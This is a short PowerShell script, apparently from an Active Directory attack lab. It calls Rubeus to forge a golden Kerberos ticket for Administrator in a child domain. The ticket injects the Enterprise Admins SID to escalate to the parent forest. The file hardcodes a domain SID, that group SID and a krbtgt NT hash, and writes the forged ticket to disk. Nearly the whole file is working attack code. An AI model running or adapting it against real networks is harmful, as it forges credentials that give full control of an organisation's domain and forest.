[CmdletBinding()]
param(
    [string]$ChildSid = 'S-1-5-21-2616196951-1941128886-767624593',
    [string]$EaSid = 'S-1-5-21-277764030-1371232215-1561074416-519',
    [string]$KrbtgtNt = 'b6c370f260f2ec4a9eabaedf34882ec1'
)
$ErrorActionPreference = "Continue"

$rubeus = 'C:\Tools\ADTools\Rubeus.exe'
$ticket = 'C:\Tools\cadre-attack\T102-capture\EA-rubeus.kirbi'
Remove-Item $ticket -ErrorAction SilentlyContinue

Write-Output '--- Rubeus golden retest ---'
& $rubeus golden /user:Administrator /domain:child.cadre.local "/sid:$ChildSid" "/krbtgt:$KrbtgtNt" "/sids:$EaSid" "/ticket:$ticket" 2>&1 | ForEach-Object { Write-Output "GOLDEN|$_" }
Write-Output "EXIT $LASTEXITCODE"
Write-Output "TICKET_EXISTS $(Test-Path $ticket)"
if (Test-Path $ticket) { Write-Output "TICKET_SIZE $((Get-Item $ticket).Length)" }
